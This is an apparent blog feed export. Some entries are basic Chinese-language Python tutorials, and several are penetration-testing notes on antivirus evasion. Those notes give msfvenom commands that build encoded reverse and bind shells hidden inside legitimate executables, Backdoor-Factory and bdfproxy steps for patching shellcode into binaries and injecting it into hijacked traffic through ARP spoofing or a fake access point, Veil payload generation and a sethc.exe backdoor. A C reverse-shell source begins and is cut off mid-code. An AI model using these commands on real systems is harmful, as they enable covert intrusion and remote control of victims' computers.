    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Python数据库编程&quot;&gt;&lt;a href=&quot;#Python数据库编程&quot; class=&quot;headerlink&quot; title=&quot;Python数据库编程&quot;&gt;&lt;/a&gt;&lt;strong&gt;Python数据库编程&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;python数据库接口
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MySQL" scheme="http://c.cat.plus/categories/DBMS/MySQL/"/>
    
      <category term="Python" scheme="http://c.cat.plus/categories/Python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="mysql" scheme="http://c.cat.plus/tags/mysql/"/>
    
      <category term="pymysql" scheme="http://c.cat.plus/tags/pymysql/"/>
    
  </entry>
  
  <entry>
    <title>Python内建的数值型函数及基本输入输出</title>
    <link href="http://c.cat.plus/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/"/>
    <id>http://c.cat.plus/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</id>
    <published>2018-02-08T11:03:05.000Z</published>
    <updated>2020-07-23T16:08:49.827Z</updated>
    
    <content type="html"><![CDATA[<p><strong>预置(内建)的数值型函数</strong></p><pre><code>abs(x)        #取x的绝对值round(number,ndigits)        #对数值进行四舍五入,ndigits是小数向右取整数的位数,负数表示向左取整round(112.34567,3)pow(x,y,z=None)        #相当于 x**y 或 x**y%zhelp()        #查看函数的帮助help(函数名)例:    help(abs)    #查看abs函数的帮助文档</code></pre><p><strong>语句(statements)</strong></p><ul><li>语句是python执行的最小单位,语句可以独立执行</li></ul><p>语句实例:</p><pre><code>a=100    #赋值语句del a     #del语句print(&quot;hello&quot;)    #表达式语句1+2+3            #表达式语句</code></pre><p>说明:</p><ul><li>多条语句写在一行内需要用分号(；)分开</li><li>通常一条语句写在一行内(复合语句除外)</li></ul><p><strong>折行符 \ (反斜杠)</strong></p><ul><li>折行符是告诉解释执行器,下一行的内容也是此语句的内容</li></ul><p><strong>隐式换行</strong></p><ul><li>所有的括号的内容换行时,解释执行器会自动去下一行找到相对应的括号,直到找到为止,称为隐式换行</li></ul><p><strong>基本输入输出函数</strong></p><p>输入函数: <code>input()</code><br>作用:从标准输入设备上读取一个字符串(注:末尾的换行字符会被删除)<br>格式: <code>input(&#39;提示字符串&#39;)</code><br>注:返回一个字符串,提示字符串可以为空</p><p>输出函数: <code>print</code><br>作用:将一系列的值以字符的形式输出到标准设备上,默认为终端<br>格式: <code>print(value,...,sep=&#39;&#39;,end=&#39;\n&#39;)</code><br>关键字参数说明:<br>sep: 两个值之间的分隔符,默认为一个字格’’<br>end: 输出完毕后在流末尾自动追加一个字符串,默认为换行符 <code>&#39;\n&#39;</code></p><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a><strong>练习</strong></h4><ol><li>假设1年只有365天,输入年数,打印这些年有多少个周</li></ol><ul><li>新建 <code>years.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">"请输入年数:"</span>)</span><br><span class="line">years=int(s)</span><br><span class="line"></span><br><span class="line">weeks=years * <span class="number">365</span> // <span class="number">7</span></span><br><span class="line">days=years * <span class="number">365</span> % <span class="number">7</span></span><br><span class="line">print(<span class="string">"共有"</span>,weeks,<span class="string">"个周,余"</span>,days,<span class="string">"天."</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li>分三次输入当前的小时,分钟,秒数,在终端打印此时间距离0:0:0过了多少秒?</li></ol><ul><li>新建 <code>seconds.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">"请输入小时:"</span>)</span><br><span class="line">hours=int(s)</span><br><span class="line">s=input(<span class="string">"请输入分钟:"</span>)</span><br><span class="line">minutes=int(s)</span><br><span class="line"></span><br><span class="line">s=input(<span class="string">"请输入秒:"</span>)</span><br><span class="line">second=int(s)</span><br><span class="line">print(<span class="string">"总秒数:"</span>,hours * <span class="number">3600</span> + minutes * <span class="number">60</span> + second)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;预置(内建)的数值型函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;abs(x)        #取x的绝对值
round(number,ndigits)        #对数值进行四舍五入,ndigits是小数向右取整数的位数,负数表示向左取整
ro
      
    
    </summary>
    
    
      <category term="Python" scheme="http://c.cat.plus/categories/Python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python语言的优缺点</title>
    <link href="http://c.cat.plus/2018/02/07/Python/python%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
    <id>http://c.cat.plus/2018/02/07/Python/python%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</id>
    <published>2018-02-07T13:01:01.000Z</published>
    <updated>2020-07-21T11:07:51.066Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python的诞生"><a href="#Python的诞生" class="headerlink" title="Python的诞生"></a><strong>Python的诞生</strong></h4><ul><li>创建人: Guido van Rossum    (荷兰人)</li><li>时间: 1989年圣诞节期间</li></ul><h4 id="计算机语言发展"><a href="#计算机语言发展" class="headerlink" title="计算机语言发展"></a><strong>计算机语言发展</strong></h4><ol><li>二进制机器指令<br> 01 01 10</li><li>汇编语言<br> ADD R0 R1<br> ST    R2</li><li>编译(compile)型语言<br> C / C++ / Go /PASCAL<br> 先翻译成汇编语言,再翻译成二进制指令</li><li>解释执行语言<br> Python / Java / Php / Basic / C#</li></ol><h4 id="Python应用领域"><a href="#Python应用领域" class="headerlink" title="Python应用领域"></a><strong>Python应用领域</strong></h4><ul><li>系统自动化运维</li><li>网络编程(搜索引擎,爬虫,服务器编程等)</li><li>科学计算</li><li>人工智能,机器人</li><li>Web开发</li><li>云计算</li><li>大数据及数据库编程</li><li>教育</li><li>游戏</li></ul><p><strong>Python的优点</strong></p><ul><li>纯面向对象(Java,C++,Python,C#,Swift)</li><li>免费</li><li>可移植</li><li>可混合编程(C/C++/Java/.net)</li><li>简单易学易用</li><li>开发效率高</li><li>应用领域广泛</li><li>开源</li><li>自动化内存管理和引用计数</li></ul><p><strong>Python的缺点</strong></p><ul><li>与C/C++相比,执行速度不够快</li><li>不能封闭源代码</li><li>不能写操作系统内核和驱动程序</li></ul><p><strong>Python的解释执行器类型</strong></p><ul><li>CPython        (C语言开发,官网下载默认)</li><li>Jython        (Java语言开发)</li><li>IronPython    (.net开发)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Python的诞生&quot;&gt;&lt;a href=&quot;#Python的诞生&quot; class=&quot;headerlink&quot; title=&quot;Python的诞生&quot;&gt;&lt;/a&gt;&lt;strong&gt;Python的诞生&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;创建人: Guido van Ross
      
    
    </summary>
    
    
      <category term="Python" scheme="http://c.cat.plus/categories/Python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Backdoor-factory后门工厂免杀工具及bdfproxy</title>
    <link href="http://c.cat.plus/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</id>
    <published>2016-08-08T13:35:16.000Z</published>
    <updated>2020-06-12T09:34:47.123Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Backdoor-Factory"><a href="#Backdoor-Factory" class="headerlink" title="Backdoor-Factory"></a><strong>Backdoor-Factory</strong></h3></blockquote><p><strong>Patch</strong></p><ul><li>通过替换EXE,DLL,注册表等方法修复系统漏洞或问题的方法</li><li>BdF:向二进制文件中增加或者删除代码内容<br>  某些受保护的二进制程序无法patch<br>  存在一定概率文件会被patch坏掉</li></ul><p><strong>后门工厂</strong></p><ul><li><p>适用于windows PE x32/x64 和 Linux ELF x32/x64 (OSX)</p></li><li><p>支持MSF payload,自定义payload</p></li><li><p>将shellcode代码patch进模板文件,躲避AV检查</p></li><li><p>Python语言编写</p></li></ul><p><strong>MsF使用的patch方法</strong></p><ul><li><p>覆盖程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp...</code></p></li><li><p>创建新的线程执行shellcode并跳回原程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp -k</code><br>  增加代码片段跳转执行后跳回源程序入口</p></li></ul><p><strong>CTP 方法</strong></p><ul><li>增加新的代码段 section, 与MSF的 <code>-k</code> 方法类似</li><li>使用现有的代码裂缝/洞(code cave)存放 shellcode</li></ul><p><strong>代码洞</strong></p><ul><li>二进制文件中超过两个字节的连续 <code>x00</code> 区域(代码片段间区域)</li><li>根据统计判断代码洞是编译器在进行编译时造成的,不同的编译器造成的代码洞的大小不同</li></ul><pre><code>cp `which cat` .lshexeditor cat</code></pre><ul><li>单个代码洞大小不足以存放完整的shellcode<br>多代码洞跳转(非顺序执行)<br>初期免杀率可达100%<br>结合MsF的stager方法</li></ul><p><strong>Patch选项</strong></p><ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码洞注入</li></ul><h4 id="BdF基本使用"><a href="#BdF基本使用" class="headerlink" title="BdF基本使用"></a><strong>BdF基本使用</strong></h4><p><strong>检查二进制文件是否支持代码注入</strong></p><pre><code>backdoor-factory -f putty.exe –S</code></pre><p><strong>显示可用payload</strong></p><pre><code>backdoor-factory -f putty.exe -s showiat_reverse_tcp_stager_threaded</code></pre><p><strong>查看code cave大小</strong></p><pre><code>backdoor-factory -f putty.exe -c -l 100        #查看100字节的cave大小有多少</code></pre><ul><li>IAT—-import address table<br>指针指向WinAPI地址,被称为thunks(形实转换程序),地址预定义    </li></ul><h5 id="免杀效果对比"><a href="#免杀效果对比" class="headerlink" title="免杀效果对比"></a><strong>免杀效果对比</strong></h5><pre><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666        #单代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J        #多代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666 -a     #新加一个代码片段注入</code></pre><p><strong>与 veil-evasion 集成</strong></p><ul><li>最新版veil默认已经没有backdoor-factory模块.</li></ul><h4 id="BdFproxy"><a href="#BdFproxy" class="headerlink" title="BdFproxy"></a><strong>BdFproxy</strong></h4><p><strong>BdFproxy</strong> (mitmproxy)</p><ul><li>基于流量劫持动态注入shellcode(ARP spoof, DNS spoof, Fake AP)</li></ul><p><strong>步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1#打开路由IP转发功能</span><br><span class="line"></span><br><span class="line">#添加防火墙规则,把访问目标80&#x2F;443端口的流量重定向到8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80&#x2F;443 -j REDIRECT --toports 8080</span><br><span class="line"></span><br><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent#默认代理模式regular,修改为transparent透明代理</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 1.1.1.2 1.1.1.1#执行ARP欺骗一个目标</span><br></pre></td></tr></table></figure><ul><li><p>启动MsF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfdb init#初始化msf数据库</span><br><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_rescurce.rc</span><br></pre></td></tr></table></figure></li><li><p>Mana 创建 Fack AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mana</span><br><span class="line">vi &#x2F;etc&#x2F;mana-toolkit&#x2F;hostapd-mana.conf</span><br><span class="line">#修改无线SSID名称</span><br><span class="line"></span><br><span class="line">.&#x2F;usr&#x2F;share&#x2F;mana-toolkit&#x2F;run-mana&#x2F;start-nat-simple.sh</span><br><span class="line">修改wlan0无线网卡适配器并启动</span><br><span class="line">iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80&#x2F;443 -j REDIRECT --to-port 8080</span><br><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure></li><li><p>BdFproxy 代理注入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">bdfproxy</span><br></pre></td></tr></table></figure></li><li><p>MsF侦听反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure></li></ul><p><strong>补充内容</strong></p><ul><li>全站HTTPS防注入(微软每个补丁都带马)</li><li>PE文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<br>  全部用 0 覆盖<br>  BDF默认清除数字签名</li><li><code>https://live.sysinternals.com</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Backdoor-Factory&quot;&gt;&lt;a href=&quot;#Backdoor-Factory&quot; class=&quot;headerlink&quot; title=&quot;Backdoor-Factory&quot;&gt;&lt;/a&gt;&lt;strong&gt;Backdoor-Factory&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
  </entry>
  
  <entry>
    <title>Veil-catapult注入进程内存执行及shellter免杀</title>
    <link href="http://c.cat.plus/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/"/>
    <id>http://c.cat.plus/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/</id>
    <published>2016-08-06T15:15:06.000Z</published>
    <updated>2020-06-11T10:55:13.768Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a><strong>Veil-catapult</strong></h3></blockquote><ul><li>也属于 Veil-Framework框架的一部分</li></ul><p><strong>Payload的投递</strong></p><ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用 impacket 上传二进制 payload 文件</li><li>使用 <code>passing-the-hash</code> 触发执行 payload</li></ul><p><strong>Payload直接在内存中运行</strong></p><ul><li>payload不写入硬盘，避免文件型病毒查杀</li></ul><p><strong>Powershell Injector</strong></p><ul><li>适用于windows7及以上系统版本</li></ul><pre><code>veil-catapult         #启动veil-catapult#根据提示进行参数设置#先传了个powershell#然后传了个msf的payload#再用shell调用payload#最后反弹shell</code></pre><p><strong>Barebones Python Injector</strong></p><ul><li>适用于powershell injector 失败的情况下使用</li></ul><p><strong>Sethc backdoor</strong></p><ul><li>用 cmd.exe 替换 C:\Windows\System32\sethc.exe</li></ul><p><strong>Execute custom command</strong></p><ul><li>执行自定义命令</li></ul><p><strong>EXE delivery</strong></p><pre><code>/etc/veil/settings.py</code></pre><h4 id="另一种免杀思路"><a href="#另一种免杀思路" class="headerlink" title="另一种免杀思路"></a><strong>另一种免杀思路</strong></h4><p><strong>传统防病毒查杀原理</strong></p><ul><li>查找文件体特殊字符串,匹配则查杀</li><li>找到触发AV查杀的精确字符串,并将其修改</li></ul><ul><li>将执行程序分片成很多小片段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤,最终精确定位</li></ul><p><strong>二进制文件切片工具</strong> </p><p><code>Evade</code> , <code>Dsplit</code></p><p><strong>16进制文件编辑工具</strong></p><p><code>Hexeditor</code>    , <code>ghex</code>    #ghex是图形化界面</p><pre><code>apt-get install ghex        #kali安装ghex</code></pre><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a><strong>shellter</strong></h4><ul><li>代码混淆</li><li>定制的编码方式</li><li>多态编码</li><li>集成部分 MSF payload</li><li>目前只支持32位PE程序</li><li>使用正常的EXE文件作为模板,将payload代码加入到模板内<br>模板程序的功能将失效</li></ul><p><strong>kali安装shellter</strong></p><pre><code>apt-get install shellter    #安装使用shellter                    #按照提示使用</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Veil-catapult&quot;&gt;&lt;a href=&quot;#Veil-catapult&quot; class=&quot;headerlink&quot; title=&quot;Veil-catapult&quot;&gt;&lt;/a&gt;&lt;strong&gt;Veil-catapult&lt;/strong&gt;&lt;/h3
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="passing-the-hash" scheme="http://c.cat.plus/tags/passing-the-hash/"/>
    
      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
    
      <category term="shellter" scheme="http://c.cat.plus/tags/shellter/"/>
    
      <category term="ghex" scheme="http://c.cat.plus/tags/ghex/"/>
    
  </entry>
  
  <entry>
    <title>Veil-evasion自动生成免杀后门</title>
    <link href="http://c.cat.plus/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/"/>
    <id>http://c.cat.plus/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/</id>
    <published>2016-08-05T12:11:02.000Z</published>
    <updated>2020-06-11T11:01:27.424Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a><strong>Veil-evasion</strong></h3></blockquote><ul><li><p>属于 Veil-Framework框架的一部分</p></li><li><p>由 Python 语言编写</p></li><li><p>用于自动生成免杀 payload</p></li><li><p>集成msf payload,支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><p>   <code>Hypersion</code> , <code>PEScrambler</code> , <code>BackDoor Factory</code></p></li><li><p>集成各种开发打包运行环境</p><p>   Python: pyinstaller / py2exe<br>   C#: mono for .NET<br>   C: mingw32<br>   ruby</p></li></ul><p><strong>kali安装使用Veil-evasion</strong></p><pre><code>apt-get install veil-evasionveil        #首次运行安装环境use 1        #使用 Evasionlist        #列出shellcode编号,最新3.1版本默认41个payloaduse 35        #选择使用35号python注入型shellcodeoptions        #查看payload选项set            #可以使用set对payload进行配置generate    #确认配置后生成payload</code></pre><h4 id="MSF利用payload"><a href="#MSF利用payload" class="headerlink" title="MSF利用payload"></a><strong>MSF利用payload</strong></h4><ul><li>使用Veil-evasion生成payload后会在本地路径 <code>/var/lib/veil/output/handlers</code> 下保存MSF的处理程序</li></ul><p><strong>使用MSF侦听连接</strong></p><pre><code>msfconsole -r cat35_handler.rc        #MSF使用Veil生成的配置文件jobssessions                    #运行木马后,查看连接会话sessions -i 1                #进入会话ID,获取交互shell</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Veil-evasion&quot;&gt;&lt;a href=&quot;#Veil-evasion&quot; class=&quot;headerlink&quot; title=&quot;Veil-evasion&quot;&gt;&lt;/a&gt;&lt;strong&gt;Veil-evasion&lt;/strong&gt;&lt;/h3&gt;&lt;/b
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="Veil-evasion" scheme="http://c.cat.plus/tags/Veil-evasion/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom后门生成及Hyperion加密</title>
    <link href="http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
    <id>http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</id>
    <published>2016-08-04T11:16:32.000Z</published>
    <updated>2020-06-10T09:08:37.452Z</updated>
    
    <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = 